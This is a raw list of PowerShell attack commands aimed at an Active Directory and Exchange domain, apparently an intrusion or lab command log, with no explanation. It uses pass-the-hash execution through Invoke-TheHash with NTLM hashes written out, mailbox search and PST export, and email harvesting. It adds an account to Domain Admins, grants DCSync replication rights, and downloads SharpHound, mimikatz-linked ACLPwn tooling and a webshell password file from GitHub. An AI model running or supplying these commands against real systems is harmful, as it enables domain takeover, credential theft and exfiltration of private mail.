Import-Module C:\\ProgramData\\MailSniper.ps1; Invoke-GlobalMailSearch -ImpersonationAccount \'chlng-pdc-01.CHLNG.com\\Administrator\' -ExchHostname \'chlng-wks-1\' -OutputCsv \'C:\\ProgramData\\global-email-search.csv\';
Import-Module C:\\ProgramData\\MailSniper.ps1; Invoke-SelfSearch -Mailbox HealthMailbox44abe0d@CHLNG.com -OtherUserMailbox; 
Import-Module C:\\ProgramData\\pview.ps1; Get-NetUser | Sort-Object mail | ForEach-Object {$_.mail} | Out-File -Encoding ascii C:\\ProgramData\\emaillist.txt;

Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; . $env:ExchangeInstallPath\\bin\\RemoteExchange.ps1; Connect-ExchangeServer -auto; Get-Help Get-Mailbox;

powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Get-MailboxExportRequest
powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; New-MailboxExportRequest -Mailbox \'chong@chlng.com\' -FilePath \'\\\\chlng.com\\C$\\ProgramData\\test.pst\';

powershell [void] [System.Reflection.Assembly]::LoadWithPartialName(\'System.Windows.Forms\'); [void] [System.Reflection.Assembly]::LoadWithPartialName(\'Microsoft.VisualBasic\'); [Microsoft.VisualBasic.Interaction]::AppActivate(4404); [System.Windows.Forms.SendKeys]::SendWait(\'~\');

[Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\' ; Invoke-WebRequest -Uri \'Http:\\\\chlng.com\' -OutFile \'C:\\ProgramData\\test.html\'

Expand-Archive

Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBClient.ps1\'; Invoke-SMBClient -Domain \'chlng.com\' -Username Administrator -Hash \'1429fb97d4b6482fa9284f1f0e31e841\' -Action List -Source \'\\\\chlng.com\\C$\' -verbose


Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBClient.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBEnum -Target \'chlng.com\' -Domain \'chlng.com\' -Username Administrator -Hash \'1429fb97d4b6482fa9284f1f0e31e841\' -verbose  

Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose

Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-WMIExec.ps1\'; Invoke-WMIExec -Target \'chlng.com\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'f348587cfb111bb717f4faaa8269d059\' -Command \'whoami\' -verbose

Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-WMIExec.ps1\'; Invoke-WMIExec -Target \'chlng.com\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b4457a4de3bc3da6b5d4c5a1d9 -Hash \'1429fb97d4b6482fa9284f1f0e31e841\' -Command \'whoami\' -verbose

Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose

Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'127.0.0.1\' -Domain \'chlng.com\' -Username Administrator -Hash \'1429fb97d4b6482fa9284f1f0e31e841\' -Command \'whoami\' -verbose 


powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'127.0.0.1\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'ffc0139451b34fdb5f7ba33f0a75e086\' -Command \'whoami\' -verbose

powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBClient.ps1\'; Invoke-SMBClient -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'ffc0139451b34fdb5f7ba33f0a75e086\' -Action List -Source \'\\\\chlng.com\\SYSVOL\' -verbose

powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'localhost\' -Domain \'localhost\' -Username Administrator -Hash \'60ba4fcadc466c7a033c178194c03df6\' -Command \'powershell -File C:\\ProgramData\\script.ps1\' -verbose

powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'localhost\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'ffc0139451b34fdb5f7ba33f0a75e086\' -Command \'C:\\ProgramData\\script.bat\' -verbose

powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'127.0.0.1\' -Domain \'chlng.com\' -Username CHLNG-WKS-1$ -Hash \'86fdb74721e95a00313dc72003155fc8\' -Command \'' -verbose

powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-WMIExec.ps1\'; Invoke-WMIExec -Target \'localhost\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'ffc0139451b34fdb5f7ba33f0a75e086\' -Command \'^cmd /c ^C:\\ProgramData\\script.ps1 \^\> C:\\ProgramData\\output30.txt 2^>^&1\' -verbose

powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-WMIExec.ps1\'; Invoke-WMIExec -Target \'localhost\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'ffc0139451b34fdb5f7ba33f0a75e086\' -Command \'^Add-NetGroupUser -UserName HealthMailbox88fa07 -GroupName "domain admins" -Domain "chlng.com" \^\> C:\\ProgramData\\output30.txt 2^>^&1\' -verbose

powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://github.com/3gstudent/Homework-of-Powershell/raw/master/New-GPOImmediateTask.ps1\' -OutFile \'C:\\ProgramData\\New-GPOImmediateTask.ps1\'


powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe\' -OutFile \'C:\\ProgramData\\SharpHound.exe\'

powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://raw.githubusercontent.com/OreNPluS1/jscript_exchange_webshell/main/password.txt\' -OutFile \'C:\\ProgramData\\password.txt\'

powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Add-ADGroupMember -Identity \'Domain Admins\' -Members HealthMailbox88fa07b

powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Get-ADGroupMember \'Domain Admins\'

powershell $password = Get-Content C:\\ProgramData\\password.txt ; cd C:\\Windows\\SysWOW64\\inetsrv ; C:\\ProgramData\\Invoke-ACLPwn.ps1 -domain chlng.com -username HealthMailbox88fa07b -password $password -SharpHoundLocation C:\\ProgramData\\SharpHound.exe -mimiKatzLocation C:\\ProgramData\\mimikatz\\x64\\mimikatz.exe -userAccountToPwn chong

powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; echo test; Get-ADPermission -Identity \'cn=HealthMailbox88fa07b,dc=chlng,dc=com\'

powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; $id = [Security.Principal.WindowsIdentity]::GetCurrent(); Add-ADPermission \'chlng.com\' -User $id.Name -ExtendedRights Ds-Replication-Get-Changes,Ds-Replication-Get-Changes-All;

Powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Get-ADPermission -Identity \'CN=HealthMailbox88fa07b4457a4de3bc3da6b5d4c5a1d9,CN=Monitoring Mailboxes,CN=Microsoft Exchange System Objects,DC=CHLNG,DC=com\' ^| Write-Output 

Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Add-ADPermission \'chlng.com\' -Identity \'CN=HealthMailbox88fa07b4457a4de3bc3da6b5d4c5a1d9,CN=Monitoring Mailboxes,CN=Microsoft Exchange System Objects,DC=CHLNG,DC=com\' -ExtendedRights Ds-Replication-Get-Changes,Ds-Replication-Get-Changes-All;

import-module ^C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PowerSploit\\Recon\\PowerView.ps1

powershell import-module powersploit; import-module C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PowerSploit\\Recon\\PowerView.ps1; Set-DomainObjectOwner -Identity S-1-5-21-2993726475-773441375-2775554650-512 -OwnerIdentity \'HealthMailbox88fa07b\' -Verbose

powershell import-module powersploit; import-module C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PowerSploit\\Recon\\PowerView.ps1; Add-DomainObjectAcl -TargetIdentity HealthMailbox88fa07b -PrincipalIdentity chong -Rights DCSync -Verbose

New-GPOImmediateTask -TaskName Debugging -GPODisplayName SecurePolicy -CommandArguments 'dir C:\\' -Force